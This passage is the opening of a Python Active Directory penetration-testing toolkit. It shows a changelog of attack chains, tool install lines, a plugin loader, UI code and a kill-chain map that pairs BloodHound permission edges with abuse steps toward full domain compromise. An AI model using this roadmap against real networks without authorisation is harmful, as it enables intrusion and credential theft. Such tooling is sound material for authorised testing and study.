#!/usr/bin/env python3
# =============================================================================
# segfault-ad -- Active Directory pentest toolkit
# segfault.solutions
# version: 2.9.0
# changelog:
#   1.0.0 — initial release (Forest, Escape, Certified chains)
#   1.1.0 — ESC9 rewrite, certipy auth fix, shadowcred Kerberos
#   1.2.0 — writeowner Kerberos, addtogroup ccache clear, pivot cmd, flag cmd
#   1.3.0 — Authority chain: addcomputer, passthecert modules
#   1.4.0 — Manager chain: ESC7 full chain, spray fix, hashcrack module
#   1.5.0 — dcsync auto-pivot, bloodyenum acl modes, pathfind edge types
#   1.6.0 — kerberoast no-preauth, RID brute fallback, LDAPS auto-retry
#   1.7.0 — _load_bh rusthound-ce fix, _build_graph CE edge types, version tracking
#   1.8.0 — rusthound-ce Kerberos ccache auto-detect, LDAPS auto-retry, auto-load ccache on startup
#   2.9.0 — plugin system, file logging, BH cache, cred encryption, retry decorator, check_tool cache, improved cleanup/report
#            kerberoast no-preauth mode, RID brute cred fallback, bloodyad_args Kerberos support
#            resetpwd Kerberos retry, shadowcred password-auth-first, bloodyenum acl 3 modes
#   1.9.0 — ESC13 detection, group scope flip module, JEA endpoint module, GodPotato module
#            cross-domain DACL support, RC4 disabled handling, ldeep AES256 in gmsa, foreign group pathfind
#   2.0.0 — pywhisker, pkinit/gettgtpkinit, unpac-the-hash, ldap-shell, crossdomain module
#            asreproast john fallback, hashcrack kerbrute extract + john fallback
#            flag ccache priority fix, hint/explain/autopwn AI commands, NoPAC, DFSCoerce fix
#
# Usage:
#   python3 segfault-ad.py
#   python3 segfault-ad.py -d domain.local -u user -p pass --dc 10.10.10.1
#
# pip install impacket certipy-ad bloodyad bloodhound ldapdomaindump ldeep adidnsdump pywhisker pywerview gMSADumper pre2k coercer ldap3 netexec --break-system-packages
# apt install kerbrute enum4linux smbclient ldap-utils
# =============================================================================

import os, sys, shutil, argparse, readline, subprocess, threading, configparser
import signal

VERSION = "2.9.0"

# ── clean Ctrl+C handling ─────────────────────────────────────────────────────
_ACTIVE_PROCS   = set()
_ACTIVE_PROCS_L = threading.Lock()
_INTERRUPTED    = threading.Event()

def _register_proc(proc):
    with _ACTIVE_PROCS_L: _ACTIVE_PROCS.add(proc)

def _unregister_proc(proc):
    with _ACTIVE_PROCS_L: _ACTIVE_PROCS.discard(proc)

def _sigint_handler(sig, frame):
    """Kill active subprocesses and return cleanly to REPL."""
    _INTERRUPTED.set()
    with _ACTIVE_PROCS_L:
        for proc in list(_ACTIVE_PROCS):
            try: proc.terminate(); proc.kill()
            except Exception: pass
    print(f'\n  \033[38;2;255;140;66m[!]\033[0m interrupted')
    _INTERRUPTED.clear()
    raise KeyboardInterrupt

signal.signal(signal.SIGINT, _sigint_handler)

import re, json, glob, sqlite3, logging, importlib.util, functools, time
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

# =============================================================================
# CONFIG — centralized paths and settings
# =============================================================================
class Config:
    BASE        = os.path.expanduser('~/.segfault-ad')
    WORKSPACES  = os.path.join(BASE, 'workspaces')
    TOOLS       = os.path.join(BASE, 'tools')
    PLUGINS     = os.path.join(BASE, 'plugins')
    LOGS        = os.path.join(BASE, 'logs')
    DB          = os.path.join(BASE, 'segfault.db')
    KEY         = os.path.join(BASE, '.key')
    HISTORY     = os.path.join(BASE, 'history')
    WIN_TOOLS   = os.path.join(BASE, 'tools', 'win')
    WORDLISTS = {
        'rockyou':   '/usr/share/wordlists/rockyou.txt',
        'usernames': '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt',
        'passwords': '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
    }

CFG = Config()
for _d in [CFG.BASE, CFG.WORKSPACES, CFG.TOOLS, CFG.PLUGINS, CFG.LOGS, CFG.WIN_TOOLS]:
    os.makedirs(_d, exist_ok=True)


# =============================================================================
# LOGGING — file + console, daily rotation
# =============================================================================
from datetime import datetime as _dt

def _setup_logging():
    log_file = os.path.join(CFG.LOGS, f'segfault_{_dt.now():%Y%m%d}.log')
    logger   = logging.getLogger('segfault-ad')
    logger.setLevel(logging.DEBUG)
    if not logger.handlers:
        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(message)s'))
        logger.addHandler(fh)
    return logger

_LOG = _setup_logging()

def _logfile(msg, level='info'):
    """Write to log file only (not console)."""
    getattr(_LOG, level, _LOG.info)(msg)


# =============================================================================
# RETRY DECORATOR — auto-retry network/subprocess ops
# =============================================================================
def retry(max_attempts=3, delay=1, backoff=2, exceptions=(Exception,)):
    """Decorator: retry on failure with exponential backoff."""
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            last_exc = None
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except exceptions as e:
                    last_exc = e
                    if attempt < max_attempts - 1:
                        wait = delay * (backoff ** attempt)
                        _logfile(f'retry {func.__name__} attempt {attempt+1}/{max_attempts} after {wait}s: {e}')
                        time.sleep(wait)
            raise last_exc
        return wrapper
    return decorator


# =============================================================================
# BLOODHOUND DATA CACHE — avoid re-parsing on every pathfind call
# =============================================================================
_BH_CACHE      = {}   # loot_dir → (data, adj, sn, st, hv, dom_sid)
_BH_CACHE_TIME = {}   # loot_dir → mtime

def _bh_cache_valid(loot_dir):
    bh_dir = os.path.join(loot_dir, 'bloodhound')
    if not os.path.isdir(bh_dir): return False
    mtime = max((os.path.getmtime(f) for f in glob.glob(os.path.join(bh_dir,'**','*.json'),recursive=True)),
                default=0)
    return _BH_CACHE_TIME.get(loot_dir,0) >= mtime

def get_bh_data(loot_dir):
    """Return cached BloodHound data, reloading if JSON files changed."""
    if loot_dir not in _BH_CACHE or not _bh_cache_valid(loot_dir):
        _logfile(f'loading BloodHound data from {loot_dir}')
        data = _load_bh(loot_dir)
        adj, sn, st, hv, dom_sid = _build_graph(data)
        _BH_CACHE[loot_dir] = (data, adj, sn, st, hv, dom_sid)
        bh_dir = os.path.join(loot_dir,'bloodhound')
        files  = glob.glob(os.path.join(bh_dir,'**','*.json'),recursive=True)
        _BH_CACHE_TIME[loot_dir] = max((os.path.getmtime(f) for f in files), default=0)
    return _BH_CACHE[loot_dir]

def invalidate_bh_cache(loot_dir=None):
    """Invalidate BloodHound cache (call after new adrecon)."""
    if loot_dir:
        _BH_CACHE.pop(loot_dir, None)
        _BH_CACHE_TIME.pop(loot_dir, None)
    else:
        _BH_CACHE.clear()
        _BH_CACHE_TIME.clear()


# =============================================================================
# CREDENTIAL ENCRYPTION — optional Fernet encryption for DB values
# =============================================================================
_CIPHER = None

def _init_cipher():
    global _CIPHER
    try:
        from cryptography.fernet import Fernet as _Fernet
        if os.path.exists(CFG.KEY):
            key = open(CFG.KEY,'rb').read()
        else:
            key = _Fernet.generate_key()
            with open(CFG.KEY,'wb') as f: f.write(key)
            os.chmod(CFG.KEY, 0o600)
        _CIPHER = _Fernet(key)
        _logfile('credential encryption initialized')
    except ImportError:
        _logfile('cryptography not installed — credentials stored in plaintext','warning')
    except Exception as e:
        _logfile(f'cipher init failed: {e}','warning')

_init_cipher()

def _encrypt(val):
    if _CIPHER and val:
        try: return _CIPHER.encrypt(val.encode()).decode()
        except Exception: pass
    return val

def _decrypt(val):
    if _CIPHER and val:
        try: return _CIPHER.decrypt(val.encode()).decode()
        except Exception: pass
    return val


# =============================================================================
# PLUGIN SYSTEM — load custom modules from ~/.segfault-ad/plugins/
# =============================================================================
def load_plugins(modules_dict):
    """Load .py plugin files from plugins dir and register their modules."""
    if not os.path.isdir(CFG.PLUGINS): return
    loaded = []
    for fname in sorted(os.listdir(CFG.PLUGINS)):
        if not fname.endswith('.py') or fname.startswith('_'): continue
        fpath = os.path.join(CFG.PLUGINS, fname)
        try:
            spec   = importlib.util.spec_from_file_location(fname[:-3], fpath)
            mod    = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            if hasattr(mod, 'register_plugin'):
                mod.register_plugin(modules_dict)
                loaded.append(fname[:-3])
                _logfile(f'plugin loaded: {fname}')
            elif hasattr(mod, 'PLUGIN_MODULES'):
                for cls in mod.PLUGIN_MODULES:
                    modules_dict[cls.name] = cls
                    loaded.append(cls.name)
                    _logfile(f'plugin module registered: {cls.name}')
        except Exception as e:
            _logfile(f'plugin {fname} failed: {e}','error')
    if loaded:
        pass  # will print after RESET is defined

_PLUGINS_LOADED = []  # filled after MODULES defined


def _sudo_run(cmd_str):
    """Run a sudo shell command with full terminal access — bypasses readline raw mode."""
    import termios as _t, tty as _tty
    fd = sys.stdin.fileno()
    try:
        old = _t.tcgetattr(fd)
        _t.tcsetattr(fd, _t.TCSADRAIN, old)
    except Exception:
        old = None
    try:
        ret = os.system(cmd_str)
    finally:
        if old:
            try: _t.tcsetattr(fd, _t.TCSADRAIN, old)
            except Exception: pass
    return ret
from datetime import datetime

RESET  = '\033[0m';  BOLD   = '\033[1m'
C0     = '\033[38;2;0;229;255m';   C1     = '\033[38;2;0;180;210m'
RED    = '\033[38;2;255;77;106m';  GREEN  = '\033[38;2;40;200;64m'
ORANGE = '\033[38;2;255;140;66m';  GREY   = '\033[38;2;94;114;128m'
PINK   = '\033[38;2;255;110;180m'; WHITE  = '\033[38;2;221;232;238m'
PURPLE = '\033[38;2;160;122;255m'

_start_time  = __import__('time').monotonic()


def make_banner():
    E = RESET
    def _g(text, c0, c1):
        n = max(len(text)-1, 1); out = ''
        for i, ch in enumerate(text):
            t = i/n
            r,g,b = int(c0[0]+(c1[0]-c0[0])*t),int(c0[1]+(c1[1]-c0[1])*t),int(c0[2]+(c1[2]-c0[2])*t)
            out += f'\033[38;2;{r};{g};{b}m{ch}'
        return out + E
    logo = [
        ('\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557', (0,229,255),(60,180,255)),
        ('\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u255d', (30,210,255),(90,160,255)),
        ('\u255a\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551   ', (80,170,255),(140,130,255)),
        (' \u255a\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551   ', (140,130,255),(190,100,255)),
        ('\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551   ', (190,100,255),(240,80,220)),
        ('\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d     \u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d   ', (240,80,220),(255,80,180)),
    ]
    BW = 68; htxt = 'SEGFAULT.SOLUTIONS'; hfill = BW+2-len(htxt)-5
    top    = f'\u250c\u2500[ {C0}{htxt}{E} ]' + '\u2500'*hfill + '\u2510'
    empty  = '\u2502' + ' '*(BW+2) + '\u2502'
    bottom = '\u2514' + '\u2500'*(BW+2) + '\u2518'

    # AD subtitle — gradient purple→pink, right-aligned
    # pad is computed on VISIBLE length only (ANSI codes are zero-width)
    ad_txt = '// ACTIVE DIRECTORY'
    ad_out = ''
    ad_c0, ad_c1 = (160,122,255), (255,80,180)
    n = max(len(ad_txt)-1,1)
    for i,ch in enumerate(ad_txt):
        t = i/n
        r,g,b = int(ad_c0[0]+(ad_c1[0]-ad_c0[0])*t),int(ad_c0[1]+(ad_c1[1]-ad_c0[1])*t),int(ad_c0[2]+(ad_c1[2]-ad_c0[2])*t)
        ad_out += f'\033[38;2;{r};{g};{b}m{ch}'
    ad_out += E
    # inner width = BW+2, subtract 2 borders = BW visible chars per line
    # we want: <left_pad><ad_txt><right_pad> = BW chars, right_pad = 2
    ad_right  = 2
    ad_left   = (BW + 2) - len(ad_txt) - ad_right
    ad_line   = f'\u2502{" "*ad_left}{ad_out}{" "*ad_right}\u2502'

    tl   = 'certipy  //  bloodyAD  //  impacket  //  netexec  //  rubeus'
    out  = '\n' + top + '\n' + empty + '\n'
    for text, c0, c1 in logo:
        pad = ' ' * max(0, BW-2-len(text))
        out += f'\u2502  {_g(text,c0,c1)}{pad}  \u2502\n'
    out += ad_line + '\n'
    out += empty + '\n'
    tpad = ' ' * max(0, BW-len(tl))
    out += f'\u2502  {GREY}{tl}{E}{tpad}\u2502\n' + bottom + '\n'
    return out

BANNER = make_banner()

def hr():
    print(f'{GREY}{chr(8212) * shutil.get_terminal_size().columns}{RESET}')

def log(msg, level='info'):
    ts = datetime.now().strftime('%H:%M:%S')
    icons = {'info':f'{C0}[*]{RESET}','success':f'{GREEN}[+]{RESET}','warn':f'{ORANGE}[!]{RESET}','error':f'{RED}[-]{RESET}'}
    print(f'  {GREY}{ts}{RESET} {icons.get(level,icons["info"])} {WHITE}{msg}{RESET}')

BG_BAR  = '\033[48;5;235m'
FG_ACC  = '\033[38;5;45m'
FG_GRN  = '\033[38;5;82m'
FG_DIM  = '\033[38;5;240m'
FG_WHT  = '\033[38;5;255m'
FG_ORG  = '\033[38;5;208m'
FG_RED2 = '\033[38;5;196m'
FG_PNK  = '\033[38;5;213m'

_START_TIME = None
import time as _time_mod; _START_TIME = _time_mod.time()

def _startup_banner():
    global _START_TIME
    import time as _t; _START_TIME = _t.time()

    sys.stdout.write('\033[2J\033[H')
    sys.stdout.flush()
    print(BANNER)

    # ── boot sequence ────────────────────────────────────────────────────────
    DIM = '\033[38;2;40;55;65m'

    def _tag(status):
        if   status == 'ok':   return f'{PINK}  ✓   {RESET}'
        elif status == 'warn': return f'{ORANGE}  !!  {RESET}'
        else:                  return f'{RED}  ✗   {RESET}'

    def _chk(*names):
        return 'ok' if any(shutil.which(n) for n in names) else 'warn'

    boot = [
        (_chk('certipy','certipy-ad'), 'loading modules',       'certipy  bloodyAD  impacket  netexec',  0.10),
        (_chk('nmap'),                 'checking tools',         'nmap  rusthound-ce  hashcat  john',     0.08),
        ('ok',                         'initializing workspace', '~/.segfault-ad',                0.07),
        (_chk('python3'),              'kerberos',               'krb5.conf  clockskew  ccache',          0.09),
        ('ok',                         'bloodhound engine',      'graph parser  pathfinder  edge mapper', 0.11),
        ('ok',                         'autopwn chains',         'certified  rustykey  redelegate',       0.06),
        ('ok',                         'ai assistant',           'claude-sonnet  hint  explain  autopwn', 0.08),
    ]

    for status, label, detail, delay in boot:
        _t.sleep(delay)
        print(f'  {GREY}[{RESET}{_tag(status)}{GREY}]{RESET}  {WHITE}{label:<28}{RESET}  {DIM}{detail}{RESET}')

    # ── version line ─────────────────────────────────────────────────────────
    print(f'\n  {GREY}v{VERSION}  ·  2026-08-06  ·  segfault.solutions{RESET}\n')

def _get_workspace():
    """Extract workspace name — only if explicitly set by user."""
    try:
        if TARGET.workspace_set and TARGET.loot_dir:
            pp = TARGET.loot_dir.replace('\\\\', '/').split('/')
            if 'loot' in pp:
                i = pp.index('loot')
                if i > 0: return pp[i - 1]
    except Exception: pass
    return ''

def _attack_map():
    """Kill chain timeline — connected nodes + faded next step hint."""
    if not _SESSION_RESULTS:
        return ''

    DIM    = '\033[38;2;40;55;65m'
    DETAIL = '\033[38;2;80;100;110m'
    C1     = '\033[38;2;0;180;210m'
    cols   = shutil.get_terminal_size((120, 24)).columns

    # ── node color by module category ────────────────────────────────────────
    _MOD_COLOR = {
        # recon — cyan
        'nmap':C1,'enum':C1,'ldapenum':C1,'adrecon':C1,'kerbrute':C1,
        'shares':C1,'nxcmodules':C1,'unauth':C1,'rpcenum':C1,'aclscan':C1,
        'pathfind':C1,'bh-query':C1,'snaffler':C1,'powerview':C1,
        # credentials — orange
        'asreproast':'\033[38;2;255;140;66m',
        'kerberoast': '\033[38;2;255;140;66m',
        'hashcrack':  '\033[38;2;255;140;66m',
        'spray':      '\033[38;2;255;140;66m',
        'gpp':        '\033[38;2;255;140;66m',
        'lsassy':     '\033[38;2;255;140;66m',
        # shell / lateral — green (owned!)
        'exec':   '\033[38;2;40;200;64m',
        'pth':    '\033[38;2;40;200;64m',
        'ptt':    '\033[38;2;40;200;64m',
        'bloody': '\033[38;2;40;200;64m',
        # exploitation — red
        'dcsync':      '\033[38;2;248;81;73m',
        'certipy':     '\033[38;2;248;81;73m',
        'backupabuse': '\033[38;2;248;81;73m',
        'zerologon':   '\033[38;2;248;81;73m',
        'nopac':       '\033[38;2;248;81;73m',
        'relay':       '\033[38;2;248;81;73m',
        'pathpwn':     '\033[38;2;248;81;73m',
        # flags / DA — gold
        'flag':    '\033[38;2;210;153;34m',
        'flags':   '\033[38;2;210;153;34m',
        'dcshadow':'\033[38;2;210;153;34m',
    }

    # detect if DA was reached (dcsync or flag in results)
    _da_reached = any(r['module'] in ('dcsync','secretsdump','flag','flags')
                      for r in _SESSION_RESULTS)
    _has_shell  = any(r['module'] == 'exec' for r in _SESSION_RESULTS)

    nodes = _SESSION_RESULTS[-12:]
    n     = len(nodes)
    if n == 0: return ''

    last_mod    = nodes[-1]['module']
    last_detail = nodes[-1]['detail']

    # for certipy, extract ESC number
    _esc_next = None
    if last_mod == 'certipy':
        _em = re.search(r'ESC(\d+)', last_detail)
        if _em:
            _esc_next = f'esc{_em.group(1)}'

    # for pathfind, extract edge type and map to bloody action
    _pathfind_next = None
    if last_mod == 'pathfind':
        _edge_map = {
            'WriteOwner':          ('writeowner',  'take ownership'),
            'Owns':                ('writeowner',  'take ownership'),
            'GenericAll':          ('genericall',  'full control'),
            'WriteDacl':           ('writeowner',  'dacl abuse'),
            'GenericWrite':        ('setattr',     'write attr'),
            'AddMember':           ('addtogroup',  'add to group'),
            'AddSelf':             ('addself',      'add self'),
            'ForceChangePassword': ('resetpwd',    'reset pwd'),
            'AllExtendedRights':   ('resetpwd',    'extended rights'),
            'AddKeyCredentialLink':('shadowcred',  'shadow creds'),
            'GetChangesAll':       ('dcsync',      'dcsync'),
            'CanPSRemote':         ('exec',        'get shell'),
            'AdminTo':             ('exec',        'get shell'),
        }
        for edge, (action, desc) in _edge_map.items():
            if edge in last_detail:
                _pathfind_next = (action, desc)
                break
        if not _pathfind_next:
            _pathfind_next = ('bloody', 'abuse edge')

    _next_step_map = {
        'enum':       ('kerbrute',  'bruteforce'),
        'adrecon':    ('pathfind',  'graph path'),
        'pathfind':   ('bloody',    'abuse edge'),
        'kerberoast': ('hashcrack', 'crack hash'),
        'asreproast': ('hashcrack', 'crack hash'),
        'hashcrack':  ('spray',     'pwd spray'),
        'spray':      ('exec',      'get shell'),
        'shadowcred': ('bloody',    'resetpwd'),
        'esc9':       ('dcsync',    'dump hashes'),
        'esc1':       ('dcsync',    'dump hashes'),
        'dcsync':     ('exec',      'get shell'),
        'tgt':        ('exec',      'get shell'),
        'exec':       ('flag',      'grab flags'),
    }

    if _esc_next:
        next_hint = (_esc_next, f'exploit {_esc_next.upper()}')
    elif _pathfind_next:
        next_hint = _pathfind_next
    else:
        next_hint = _next_step_map.get(last_mod)

    total  = n + (1 if next_hint else 0)
    node_w = min(28, (cols - 2) // total)
    center = node_w // 2

    name_line = ''; circle_line = ''; detail_line = ''; skip_spaces = 0

    for i, entry in enumerate(nodes):
        is_last = (i == n - 1) and not next_hint
        mod_key = entry['module']

        # pick color — DA/shell nodes glow differently
        if mod_key in _MOD_COLOR:
            circle_color = _MOD_COLOR[mod_key]
        elif i == n - 1:
            circle_color = PINK
        else:
            circle_color = C1

        # circle symbol — owned = filled star, DA = crown, else dot
        if mod_key in ('flag','flags'):
            sym = '★'
        elif mod_key == 'dcsync':
            sym = '◈'
        elif mod_key == 'exec':
            sym = '◉'
        elif mod_key in ('pathpwn','certipy','relay'):
            sym = '◆'
        else:
            sym = '◉'

        mod    = entry['module'][:node_w-1].center(node_w)
        detail = entry['detail'][:node_w-1].center(node_w)

        name_line   += f'{GREY}{mod}{RESET}'
        detail_line += f'{DETAIL}{detail}{RESET}'
        lead = center - skip_spaces

        if is_last:
            circle_line += ' ' * lead + f'{circle_color}{sym}{RESET}'
            skip_spaces  = 0
        else:
            dashes = node_w - 1
            circle_line += ' ' * lead + f'{circle_color}{sym}{RESET}' + f'{DIM}{"─" * dashes}{RESET}'
            skip_spaces  = center

    if next_hint:
        hint_mod, hint_detail = next_hint
        mod    = f'? {hint_mod}'[:node_w-1].center(node_w)
        detail = hint_detail[:node_w-1].center(node_w)
        lead   = center - skip_spaces
        name_line   += f'{DIM}{mod}{RESET}'
        detail_line += f'{DIM}{detail}{RESET}'
        circle_line += ' ' * lead + f'{DIM}◎{RESET}'

    # DA reached banner
    _da_banner = ''
    if _da_reached:
        _da_banner = f'\n  {"\033[38;2;210;153;34m"}★ DOMAIN ADMIN{RESET}  {GREY}full domain compromise{RESET}'

    return f'{name_line}\n{circle_line}\n{detail_line}{_da_banner}\n'

def _footer_bar():
    """Boxed footer: context-aware hints left, user+uptime stacked right."""
    import time as _t, glob as _gl, os as _os
    cols = shutil.get_terminal_size((120, 24)).columns
    DIM  = '\033[38;2;40;55;65m'

    # ── context detection ─────────────────────────────────────────────────────
    has_target   = bool(TARGET and TARGET.domain and TARGET.dc)
    has_creds    = bool(TARGET and (TARGET.password or TARGET.hash))
    has_tgt      = bool(TARGET and _os.environ.get('KRB5CCNAME') and
                        _os.path.exists(_os.environ.get('KRB5CCNAME','')))
    has_kerberoast = any(r['module'] == 'kerberoast' for r in _SESSION_RESULTS)
    has_adrecon    = any(r['module'] == 'adrecon'    for r in _SESSION_RESULTS)
    has_shell      = any(r['module'] == 'exec'       for r in _SESSION_RESULTS)
    has_dcsync     = any(r['module'] == 'dcsync'     for r in _SESSION_RESULTS)
    has_esc        = any(r['module'] in ('esc9','certipy') for r in _SESSION_RESULTS)
    loot           = TARGET.loot_dir if TARGET else ''
    has_hashes     = bool(loot and _gl.glob(_os.path.join(loot,'*hash*.txt')))
    ws_set         = bool(TARGET and getattr(TARGET,'workspace_set',False))

    # ── build context hints ───────────────────────────────────────────────────
    # each hint: (key, description, highlight)
    # highlight=True → key shown in PINK instead of cyan
    def h(key, desc, highlight=False): return (key, desc, highlight)

    hints = []

    # always present
    hints.append(h('?', 'help'))

    if not has_target:
        hints.append(h('set', 'target ←', highlight=True))
    else:
        hints.append(h('set', 'target'))

    if not ws_set:
        hints.append(h('ws', 'workspace ←', highlight=True))
    elif not has_adrecon:
        hints.append(h('adrecon', 'collect ←', highlight=True))
    elif has_kerberoast and has_hashes:
        hints.append(h('hashcrack', 'crack ←', highlight=True))
    elif has_esc:
        hints.append(h('certipy', 'exploit ←', highlight=True))
    elif has_dcsync:
        hints.append(h('exec', 'shell ←', highlight=True))
    else:
        hints.append(h('modules', 'all'))

    if not has_tgt and has_creds:
        hints.append(h('tgt', 'kerberos ←', highlight=True))
    else:
        hints.append(h('tgt', 'kerberos'))

    hints.append(h('exec',    'shell'))
    hints.append(h('bloody',  'acl'))
    hints.append(h('cleanup', 'undo'))
    hints.append(h('q',       'quit'))

    # ── render hints ──────────────────────────────────────────────────────────
    hint_plain = '  '.join(f'{k} {v}' for k, v, _ in hints)
    hint_color = '  '.join(
        f'{PINK if hi else C0}{k}{RESET} {GREY}{v}{RESET}'
        for k, v, hi in hints
    )

    up  = int(_t.time() - _START_TIME) if _START_TIME else 0
    h, r = divmod(up, 3600); m, s2 = divmod(r, 60)
    up_s  = f'{h:02d}:{m:02d}:{s2:02d}'
    user  = (TARGET.user or '') if TARGET else ''

    right_plain = max(len(user), len(f'up:{up_s}'))
    inner       = cols - 4
    gap         = max(2, inner - len(hint_plain) - right_plain)
    user_pad    = ' ' * (gap + right_plain - len(user)) if user else ' ' * gap
    uptime_pad  = ' ' * (gap + right_plain - len(f'up:{up_s}'))

    right_user = f'{GREY}{user}{RESET}' if user else ''
    right_up   = f'{GREY}up:{up_s}{RESET}'

    top_row = f'  {hint_color}{user_pad}{right_user}'
    bot_row = f'  {" " * len(hint_plain)}{uptime_pad}{right_up}'
    border      = f'{GREY}{"─" * (cols - 2)}{RESET}'
    label_plain = '[ attack map ]'
    label_str   = f'{GREY}[ {RESET}{WHITE}attack map{RESET}{GREY} ]{RESET}'
    left        = (cols - 2 - len(label_plain)) // 2
    right       = (cols - 2 - len(label_plain)) - left
    border_map  = f'{GREY}{"─" * left}{RESET}{label_str}{GREY}{"─" * right}{RESET}'

    # ── attack map ───────────────────────────────────────────────────────────
    attack_map = _attack_map()

    # ── results pane ─────────────────────────────────────────────────────────
    recent = _SESSION_RESULTS[-_RESULTS_MAX:]

    map_block  = f'{attack_map}{border}\n' if attack_map else ''
    top_border = border_map if attack_map else border
    return f'{top_border}\n{map_block}{top_row}\n{bot_row}\n{border}'

def prompt():
    """Print boxed footer bar, return readline prompt string."""
    ws = _get_workspace()
    u  = TARGET.user   or '' if TARGET else ''
    d  = TARGET.domain or '' if TARGET else ''

    # workspace label — right-aligned, pink, with fallback
    ws_label = ws if ws else 'no workspace'
    ws_color = PINK if ws else GREY
    cols     = shutil.get_terminal_size((120, 24)).columns
    pad      = max(0, cols - len(ws_label) - 2)
    title    = ' ' * pad + f'{ws_color}{ws_label}{RESET}'

    sys.stdout.write('\n')
    sys.stdout.write(title + '\n')
    sys.stdout.write(_footer_bar() + '\n')
    sys.stdout.flush()

    if u and d:
        short_d   = d.split('.')[0] if '.' in d else d
        user_part = f'\001{GREY}\002{u}@{short_d}\001{RESET}\002 '
    elif u:
        user_part = f'\001{GREY}\002{u}\001{RESET}\002 '
    else:
        user_part = ''
    return f'  {user_part}\001{BOLD}{C0}\002→\001{RESET}\002 '

def spawn_bg_terminal(cmd, title='shell'):
    """Spawn a command in a background terminal window. Falls back to tmux, then foreground."""
    import shlex as _shlex
    cmd_str = ' '.join(_shlex.quote(c) for c in cmd) if isinstance(cmd, list) else cmd
    cmd_list = cmd if isinstance(cmd, list) else _shlex.split(cmd)

    term = check_tool('qterminal','mate-terminal','lxterminal','gnome-terminal','konsole','xfce4-terminal','tilix','xterm')
    if term:
        if 'xterm' in term:
            bg = [term,'-T',title,'-e',cmd_str]
        elif 'gnome-terminal' in term:
            bg = [term,'--title',title,'--'] + cmd_list
        elif 'konsole' in term:
            bg = [term,'--new-tab','-e',cmd_str]
        elif 'qterminal' in term:
            bg = [term,'-e',cmd_str]
        elif 'mate-terminal' in term:
            bg = [term,'--title',title,'-e',cmd_str]
        elif 'lxterminal' in term:
            bg = [term,'--title',title,'-e',cmd_str]
        else:
            bg = [term,'-e',cmd_str]
        subprocess.Popen(bg, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log(f'{GREEN}Spawned in background terminal: {WHITE}{title}{RESET}','success')
        return True

    tmux = check_tool('tmux')
    if tmux:
        if os.environ.get('TMUX'):
            # already inside tmux — open new window
            subprocess.Popen([tmux,'new-window','-n',title,cmd_str],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            # not in tmux — start a new session in background
            subprocess.Popen([tmux,'new-session','-d','-s',title,'-n',title,cmd_str],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            log(f'{GREY}Attach with: {WHITE}tmux attach -t {title}{RESET}','info')
        log(f'{GREEN}Spawned in tmux: {WHITE}{title}{RESET}','success')
        return True

    log(f'{ORANGE}No terminal/tmux found — run manually: {WHITE}{cmd_str}{RESET}','warn')
    return False


@functools.lru_cache(maxsize=256)
def check_tool(*names):
    for n in names:
        p = shutil.which(n)
        if p: return p
    # also search ./tools/ subdirs for scripts cloned by installer
    tools_dir = os.path.expanduser('~/.segfault-ad/tools')
    _local_tools = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tools')
    for _td in [tools_dir, _local_tools]:
      if os.path.isdir(_td):
        for n in names:
            for root, _, files in os.walk(_td):
                if n in files:
                    return os.path.join(root, n)
    # search known impacket examples locations on Kali
    EXTRA_PATHS = [
        '/usr/share/doc/python3-impacket/examples',
        '/usr/lib/python3/dist-packages/impacket/examples',
        os.path.expanduser('~/.local/lib/python3*/dist-packages/impacket/examples'),
    ]
    import glob as _gl_ct
    for n in names:
        for base_path in EXTRA_PATHS:
            for expanded in _gl_ct.glob(base_path):
